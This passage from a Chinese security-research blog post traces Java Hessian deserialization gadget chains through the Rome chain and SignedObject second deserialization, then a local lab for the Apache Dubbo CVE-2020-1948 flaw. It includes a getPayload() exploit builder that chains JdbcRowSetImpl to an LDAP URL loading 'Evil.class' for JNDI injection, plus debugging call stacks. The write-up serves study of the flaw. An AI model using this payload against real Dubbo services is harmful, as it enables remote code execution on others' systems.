class="line">System.out.println((HashMap)deserialize(s));</span><br></pre></td></tr></table></figure><p>没有报错，但是也没有预期中的弹计算器</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501171022871.png" alt="image-20250117102205791"></p><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>恶意TemplatesImpl套在ToStringBean中，ToStringBean套在EqualsBean中，所以在反序列化时会如同按字典映射关系进行反序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">readMap:220, UnsafeDeserializer (com.caucho.hessian.io) [3]</span><br><span class="line">readMap:114, UnsafeDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:571, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:1160, HessianInput (com.caucho.hessian.io)</span><br><span class="line">readObject:1012, HessianInput (com.caucho.hessian.io)</span><br><span class="line">deserialize:165, FieldDeserializer2FactoryUnsafe$ObjectFieldDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:208, UnsafeDeserializer (com.caucho.hessian.io) [2]</span><br><span class="line">readMap:114, UnsafeDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:571, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:1160, HessianInput (com.caucho.hessian.io)</span><br><span class="line">readObject:1012, HessianInput (com.caucho.hessian.io)</span><br><span class="line">deserialize:165, FieldDeserializer2FactoryUnsafe$ObjectFieldDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:208, UnsafeDeserializer (com.caucho.hessian.io) [1]</span><br><span class="line">readMap:114, UnsafeDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:571, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:1160, HessianInput (com.caucho.hessian.io)</span><br><span class="line">readMap:114, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:577, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:1160, HessianInput (com.caucho.hessian.io)</span><br><span class="line">deserialize:33, HessianRCE (org.example)</span><br><span class="line">main:96, HessianRCE (org.example)</span><br></pre></td></tr></table></figure><p>注意此处在恢复TempaltesImpl对象的时候，使用封装的deser进行反序列化，如下图，<code>_tfactory</code>为null，与我们预设的不同</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501201152327.png" alt="image-20250120115244228"></p><p>从而导致了在后续调用时null字段调用了getter导致了Null异常</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501171046273.png" alt="image-20250117104620183"></p><p>查看了下对应的声明，这些字段均有由transient修饰</p><blockquote><p>transient的作用是指定某个类的字段在序列化时<strong>不被序列化</strong></p></blockquote><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501171047275.png" alt="image-20250117104718186"></p><h4 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h4><p>看看TemplatesImpl的原生反序列化函数，他会在原生的readObject中帮助声明工厂字段</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501171719025.png" alt="image-20250117171934929"></p><p>因此，二次反序列化的打法应运而生。</p><blockquote><p>二次反序列化：在一个类中有字段被transient修饰，在正常序列化中无法被序列化，但是其原生的readObject中有对应的声明</p><p>因此如果我们能找到一条链子A，其含有任意对象的readObject函数，那么先触发链A，在链A中将对象设置为sink对象的，那么就可以执行原生反序列化，从而恢复完整的对象</p></blockquote><p>此处找到的对象为java.security的SignedObject</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501201201880.png" alt="image-20250120120137779"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">getObject:178, SignedObject (java.security)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:483, Method (java.lang.reflect)</span><br><span class="line">toString:137, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:116, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">beanHashCode:193, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hashCode:176, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">put:611, HashMap (java.util)</span><br><span class="line">readMap:114, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:577, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:2093, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">Hessian2_Deserial:70, Hessian2_SignObject (org.example)</span><br><span class="line">main:53, Hessian2_SignObject (org.example)</span><br></pre></td></tr></table></figure><p>然后恢复出Templates的完整对象</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501201202818.png" alt="image-20250120120233705"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">readObject:199, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:483, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1017, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1896, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line">defaultReadFields:1993, ObjectInputStream (java.io)</span><br><span class="line">readSerialData:1918, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line">access$300:206, ObjectInputStream (java.io)</span><br><span class="line">readFields:2157, ObjectInputStream$GetFieldImpl (java.io)</span><br><span class="line">readFields:541, ObjectInputStream (java.io)</span><br><span class="line">readObject:71, BadAttributeValueExpException (javax.management)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:483, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1017, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1896, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line">readObject:371, ObjectInputStream (java.io)</span><br><span class="line">getObject:180, SignedObject (java.security)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:483, Method (java.lang.reflect)</span><br><span class="line">toString:137, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:116, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">beanHashCode:193, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hashCode:176, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">put:611, HashMap (java.util)</span><br><span class="line">readMap:114, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:577, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:2093, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">Hessian2_Deserial:70, Hessian2_SignObject (org.example)</span><br><span class="line">main:53, Hessian2_SignObject (org.example)</span><br></pre></td></tr></table></figure><p>最好在Rome的toString中会循环调用getter，那么就可以拼接到TemplatesImpl的getOutputProperties了</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501201203096.png" alt="image-20250120120313011"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:483, Method (java.lang.reflect)</span><br><span class="line">toString:137, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:116, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">readObject:86, BadAttributeValueExpException (javax.management)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:483, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1017, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1896, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line">readObject:371, ObjectInputStream (java.io)</span><br><span class="line">getObject:180, SignedObject (java.security)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:483, Method (java.lang.reflect)</span><br><span class="line">toString:137, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:116, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">beanHashCode:193, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hashCode:176, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">put:611, HashMap (java.util)</span><br><span class="line">readMap:114, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:577, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:2093, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">Hessian2_Deserial:70, Hessian2_SignObject (org.example)</span><br><span class="line">main:53, Hessian2_SignObject (org.example)</span><br></pre></td></tr></table></figure><h3 id="其他链子"><a href="#其他链子" class="headerlink" title="其他链子"></a>其他链子</h3><ul><li><p>Spring PartiallyComparableAdvisorHolder链</p></li><li><p>Spring AbstractBeanFactoryPointcutAdvisor链</p></li><li><p>Resin链</p></li><li><p>XBean链</p></li></ul><h2 id="Apache-Dubbo-Hessian反序列化漏洞-CVE-2020-1948"><a href="#Apache-Dubbo-Hessian反序列化漏洞-CVE-2020-1948" class="headerlink" title="Apache Dubbo Hessian反序列化漏洞(CVE-2020-1948)"></a>Apache Dubbo Hessian反序列化漏洞(CVE-2020-1948)</h2><p>Apache Dubbo 是一款高性能的开源Java RPC框架，支持多种传输协议，例如dubbo（Dubbo Hessian2）、Hessian、RMI、HTTP等。在某些版本下，Apache Dubbo默认使用hessian，其存在反序列化漏洞，攻击者可以利用发送恶意RPC请求来触发该漏洞。</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501201452432.png" alt="img"></p><p>Apache Dubbo工作流程：</p><ol><li>首先服务容器加载并允许Provider</li><li>Provider在启动时向注册中心Registry注册自己提供的服务</li><li>Consumer在Registry处订阅Provider提供的服务</li><li>Registry返回服务地址给Consumer</li><li>Consumer根据Registry提供的服务地址调用Provider提供的服务</li><li>Consumer和Provider定时向监控中心Monitor发送一些统计数据</li></ol><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>2.7.0 &lt;&#x3D; Dubbo Version &lt;&#x3D; 2.7.6<br>2.6.0 &lt;&#x3D; Dubbo Version &lt;&#x3D; 2.6.7<br>Dubbo 所有 2.5.x 版本（官方团队目前已不支持）</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul><li>zookeeper环境搭建：<a href="https://www.apache.org/dyn/closer.lua/zookeeper/zookeeper-3.6.3/apache-zookeeper-3.6.3-bin.tar.gz">https://www.apache.org/dyn/closer.lua/zookeeper/zookeeper-3.6.3/apache-zookeeper-3.6.3-bin.tar.gz</a></li></ul><p>下载完成后将conf下的<code>zoo_sample.cfg</code>配置文件重命名为<code>zoo.cfg</code>，并配置<code>dataDir</code>和<code>dataLogDir</code>路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dataDir=Y:\YouPath\apache-zookeeper-3.6.3-bin\data</span><br><span class="line">dataLogDir=Y:\YouPath\apache-zookeeper-3.6.3-bin\log</span><br></pre></td></tr></table></figure><p>启动：zkServer.cmd，默认端口为2181</p><ul><li>代码部分：直接使用枫师傅的demo：<a href="https://github.com/Claradoll/Security_Learning">https://github.com/Claradoll/Security_Learning</a></li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501210003406.png" alt="image-20250121000305320"></p><p><strong>api：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.api;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IHello</span> &#123;</span><br><span class="line">    String <span class="title function_">IHello</span><span class="params">(String name)</span>;</span><br><span class="line">    Object <span class="title function_">IObject</span><span class="params">(Object o)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>provider：</strong></p><p>Springboot中使用了<code>@EnableDubboConfig</code>注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.dubboprovider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.spring.context.annotation.EnableDubboConfig;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDubboConfig</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DubboProviderApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(DubboProviderApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p><code>@EnableDubboConfig</code> 的作用是：</p><ol><li><strong>开启 Dubbo 配置功能</strong>：允许 Spring 自动扫描和加载与 Dubbo 相关的配置类（例如，<code>@DubboService</code> 或 <code>@DubboReference</code> 标注的内容）。</li><li><strong>启用配置中心</strong>：它可以连接到 Dubbo 的配置中心，例如 Zookeeper、Nacos 等，从而动态加载配置。</li><li><strong>注册配置 Bean</strong>：将配置类（如 <code>DubboConfig</code> 的实现类）注册到 Spring 的上下文中。</li></ol></blockquote><p>然后是路由controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.dubboprovider.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.api.IHello;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.annotation.Service;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloService</span> <span class="keyword">implements</span> <span class="title class_">IHello</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">IHello</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span>+name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">IObject</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>consumer</strong></p><p>Springboot中使用了<code>@EnableDubboConfig</code>注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.dubboconsumer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.spring.context.annotation.EnableDubboConfig;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDubboConfig</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DubboConsumerApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(DubboConsumerApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在controller中调用zookeeper的服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.dubboconsumer.consumer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.api.IHello;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.annotation.Reference;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloConsumer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Reference</span></span><br><span class="line">    <span class="keyword">private</span> IHello iHello;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@RequestParam(name = &quot;name&quot;)</span>String name)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">h</span> <span class="operator">=</span> iHello.IHello(name);</span><br><span class="line">        System.out.println(<span class="string">&quot;调用Provider&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/calc&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Hessian_Ser</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Hessian_Payload.getPayload();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">b</span> <span class="operator">=</span> iHello.IObject(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h3><p>获取构造好的恶意Hashmap</p><p>这里选择使用Rome打JdbcRowSetImpl的getter完成JNDI注入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/Basic/FromFile/Evil.class&quot;</span>;</span><br><span class="line">    <span class="comment">// String url = &quot;ldap://localhost:9999/EXP&quot;;</span></span><br><span class="line">    jdbcRowSet.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);</span><br><span class="line">    <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在calc路由下打个断点，然后访问</p><p>注意此处的iHello是个proxy class对象</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501211935845.png" alt="image-20250121193522687"></p><p>获取恶意的hashmap之后进入IObject方法，开始invoke调用</p><p>首先获取方法名和参数，然后声明创建RPC连接对象和serviceKey，并setTargetServiceUniqueName</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501211941166.png" alt="image-20250121194124043"></p><p>进入MockClusterInvoker的invoke，首先检查mock参数</p><blockquote><p>在 Dubbo 中，<code>mock</code> 是一个配置参数，用于表示服务调用是否启用“<strong>模拟逻辑</strong>”或“<strong>服务降级</strong>”功能。它的核心作用是<strong>在服务调用失败或不可用的情况下，提供一个替代逻辑来避免调用失败的影响</strong>。</p></blockquote><p>此处为false，然后进入替代逻辑，还是一个反射调用</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501211950470.png" alt="image-20250121195003345"></p><p>进入AbstractCluster的invoke，这里有个拦截器的调用</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501211955604.png" alt="image-20250121195535476"></p><p>然后一路跟进到decode，这里在处理着二进制数据的加解密</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501212012000.png" alt="image-20250121201220878"></p><p>经过<code>handleValue#RecodeableRpcResult</code>，后先入经过hessian2和hessian的readObject</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501212017882.png" alt="image-20250121201738742"></p><p>然后恢复map的时候要put，调用了Hashmap的hash函数，从而打了rome链子</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501212020168.png" alt="image-20250121202002041"></p><p>在rome链子的toString中打getter，从而JNDI注入</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501212021744.png" alt="image-20250121202121604"></p><p>完整堆栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 